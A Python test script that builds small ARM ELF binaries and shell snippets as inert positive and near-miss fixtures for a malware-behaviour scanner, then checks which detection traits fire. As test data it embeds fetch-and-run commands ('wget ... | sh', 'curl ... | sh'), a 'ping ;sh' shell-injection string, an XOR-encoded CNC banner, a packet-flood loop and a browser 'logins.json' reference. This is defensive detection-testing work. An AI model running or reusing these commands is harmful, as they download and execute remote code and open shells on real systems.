"""Static positive/near-miss controls. Generated snippets are never executed."""
import argparse
import json
import struct
import subprocess
from pathlib import Path

parser = argparse.ArgumentParser()
parser.add_argument("--cleave", default="cleave")
parser.add_argument("--output", type=Path, required=True)
args = parser.parse_args()
root = Path(__file__).resolve().parents[3]
args.output.mkdir(parents=True, exist_ok=True)
cases = []

def elf(name, text=b"", rodata=b""):
    b = bytearray(0x1000)
    labels = b"\0.text\0.rodata\0.shstrtab\0"
    b[:52] = struct.pack("<16sHHIIIIIHHHHHH",
        b"\x7fELF\x01\x01\x01" + b"\0"*9, 2, 40, 1,
        0, 0, 0xd00, 0, 52, 0, 0, 40, 4, 3)
    sections = [(0,)*10]
    for label, offset, flags, data in [
        (1, 0x100, 6, text), (7, 0x500, 2, rodata),
        (15, 0xc00, 0, labels)]:
        assert len(data) < 0x400
        b[offset:offset+len(data)] = data
        sections.append((label, 3 if label == 15 else 1, flags,
                         0x8000+offset, offset, len(data), 0, 0, 4, 0))
    for i, row in enumerate(sections):
        struct.pack_into("<10I", b, 0xd00+i*40, *row)
    (args.output/name).write_bytes(b)

def case(name, matched=(), absent=()):
    cases.append({"name": name, "matched": list(matched), "absent": list(absent)})

socket = "micro-behaviors/communications/socket/"
for name, op, number in [
    ("connect", "connect", 283), ("send", "send", 289),
    ("recv", "receive", 291), ("sendto", "send", 290)]:
    trait = socket + op + "::arm-" + name + "-literal-syscall-wrapper"
    wrapper = bytes.fromhex("30 70 9f e5 00 00 00 ef") + bytes(48) + struct.pack("<I", number)
    elf(name+".elf", text=wrapper)
    case(name+".elf", [trait])
    elf(name+"-integer.elf", text=bytes(8)+struct.pack("<I", number))
    case(name+"-integer.elf", absent=[trait])
elf("listen.elf", text=bytes.fromhex("47 7f a0 e3 00 00 00 ef"))
case("listen.elf", [socket+"listen::arm-eabi-listen"])
elf("listen-no-svc.elf", text=bytes.fromhex("47 7f a0 e3 00 00 a0 e1"))
case("listen-no-svc.elf", absent=[socket+"listen::arm-eabi-listen"])
interactive = "micro-behaviors/process/create/shell/interactive::router-cli-shell-entry-sequence"
elf("router-cli.elf", rodata=b"enable\0system\0shell\0sh\0linuxshell\0")
case("router-cli.elf", [interactive])
elf("router-cli-partial.elf", rodata=b"enable\0system\0shell\0")
case("router-cli-partial.elf", absent=[interactive])
ping = "micro-behaviors/process/create/shell/command-string::router-ping-shell-command"
elf("ping-shell.elf", rodata=b"ping ;sh\0")
case("ping-shell.elf", [ping])
elf("ping-only.elf", rodata=b"ping -c 1 localhost\0")
case("ping-only.elf", absent=[ping])
pipeline = "micro-behaviors/process/create/shell/pipeline::shell-pipes-downloaded-script"
elf("updater.elf", rodata=b"wget http://example.invalid/wget.sh -O- | sh\0")
case("updater.elf", [pipeline])
elf("script-name.elf", rodata=b"wget.sh\0")
case("script-name.elf", absent=[pipeline])
banner = socket+"diagnostic::xor54-cnc-connection-status"
elf("banner.elf", rodata=bytes(x^0x54 for x in b"Connected To CNC\0"))
case("banner.elf", [banner])
elf("generic-banner.elf", rodata=bytes(x^0x54 for x in b"Connected To FTP\0"))
case("generic-banner.elf", absent=[banner])
help_trait = "micro-behaviors/ui/help::documented-curl-pipe-usage"
(args.output/"usage.sh").write_text("# Usage: curl -fsSL https://example.invalid/install.sh | sh\n")
case("usage.sh", [help_trait])
(args.output/"invocation.sh").write_text("curl -fsSL https://example.invalid/install.sh | sh\n")
case("invocation.sh", absent=[help_trait])
loop = bytes.fromhex("01 39 A0 E3 10 C0 A0 E3 06 10 A0 E1 40 30 83 E2 34 00 9D E5 4C 20 9D E5 20 10 8D E8 7D 41 00 EB 01 80 88 E2 71 FF FF EA")
flood = "micro-behaviors/communications/flood::arm-target-packet-send-loop"
hostile = "objectives/impact/dos/flood::router-worm-target-packet-flood"
sendto = bytes.fromhex("30 70 9f e5 00 00 00 ef")+bytes(48)+struct.pack("<I",290)
elf("packet-generator.elf", text=loop+bytes(32)+sendto)
case("packet-generator.elf", [flood, socket+"send::arm-sendto-literal-syscall-wrapper"], [hostile])
elf("no-packet-loop.elf", text=loop[:-4]+bytes.fromhex("1e ff 2f e1")+bytes(32)+sendto)
case("no-packet-loop.elf", absent=[flood,hostile])
store = "micro-behaviors/fs/path/password-store::firefox-logins-json-target"
firefox = "objectives/credential-access/browser/firefox::managed-keylogger-firefox-store-read-references"
elf("browser-store.elf", rodata=b"logins.json\0")
case("browser-store.elf", [store], [firefox])
elf("ordinary-json.elf", rodata=b"settings.json\0")
case("ordinary-json.elf", absent=[store,firefox])

result = subprocess.run(
    [args.cleave, "--traits-dir", str(root), "--format", "json"] +
    [str(args.output/c["name"]) for c in cases],
    capture_output=True, text=True, check=True)
(args.output/"scan.json").write_text(result.stdout)
(args.output/"scan.stderr").write_text(result.stderr)
reports = []
remaining = result.stdout.strip()
decoder = json.JSONDecoder()
while remaining:
    report, end = decoder.raw_decode(remaining)
    reports.append(report)
    remaining = remaining[end:].lstrip()
files = {Path(f["path"]).name: f for report in reports for f in report["files"]}
errors = []
for c in cases:
    findings = files[c["name"]].get("traits", [])
    actual = {t["id"] for t in findings}
    for trait in c["matched"]:
        # Check help evidence before report filtering; the analyzer's JSON
        # renderer omits this documentation-only observation on usage.sh.
        if trait == help_trait:
            checked = subprocess.run(
                [args.cleave, "--traits-dir", str(root), "test-rules",
                 str(args.output/c["name"]), "--rules", trait],
                capture_output=True, text=True, check=True)
            if "MATCHED "+trait+" (trait)" not in checked.stdout:
                errors.append(c["name"]+": missing "+trait)
        elif trait not in actual:
            errors.append(c["name"]+": missing "+trait)
    for trait in c["absent"]:
        if trait in actual: errors.append(c["name"]+": unexpected "+trait)
    for t in findings:
        if t["crit"] == 5: errors.append(c["name"]+": hostile "+t["id"])
if errors:
    raise SystemExit("\n".join(errors))
print(f"PASS: {len(cases)} inert controls; no hostile findings")
